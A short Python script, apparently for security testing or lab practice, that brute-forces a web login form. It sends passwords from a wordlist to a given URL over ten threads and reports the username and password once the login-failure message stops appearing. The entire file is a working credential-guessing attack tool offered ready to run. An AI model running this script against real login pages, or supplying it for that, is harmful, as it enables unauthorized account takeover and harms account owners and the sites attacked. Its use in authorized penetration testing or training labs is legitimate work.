import requests
import threading
from concurrent.futures import ThreadPoolExecutor

# Get user inputs
url = input('Enter the login URL (e.g., http://example.com/login): ').strip()
username = input('Enter username for account to test: ').strip()
passwords_file = input('Enter passwords file name to be used: ').strip()
login_failed = input('Enter the login failed screen message: ').strip()
cookie_value = input('Enter cookie value (optional, format name=value): ').strip()

# Parse optional cookie if provided
cookies = {}
if cookie_value and '=' in cookie_value:
    name, val = cookie_value.split('=', 1)
    cookies[name.strip()] = val.strip()

# Control flags and locks for multithreading
stop_event = threading.Event()
print_lock = threading.Lock()

def try_password(password):
    # Skip execution if another thread already found the correct password
    if stop_event.is_set():
        return

    password = password.strip()
    if not password or password.startswith('#'):
        return

    with print_lock:
        print(f'[-] Trying password: {password}')

    data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }

    try:
        response = requests.post(url, data=data, cookies=cookies, timeout=5, allow_redirects=True)

        # Check if the failure message is absent from the response
        if login_failed not in response.text:
            with print_lock:
                print('\n==================================================')
                print(f'[+] SUCCESS! Found username: {username}')
                print(f'[+] SUCCESS! Found password: {password}')
                print('==================================================')
            # Signal all other threads to stop working
            stop_event.set()

    except requests.exceptions.RequestException:
        # Silently skip network timeouts or connection drops
        pass

def main():
    try:
        with open(passwords_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f'[-] Error: The file "{passwords_file}" was not found.')
        return

    print(f'\n[*] Starting brute-force on {url} using 10 concurrent threads...\n')

    # Use ThreadPoolExecutor to run requests in parallel
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(try_password, pwd) for pwd in passwords]

        # Monitor futures and break early if password is found
        for future in futures:
            if stop_event.is_set():
                break

    if not stop_event.is_set():
        print('\n[-] Password not found in the provided list.')

if __name__ == '__main__':
    main()
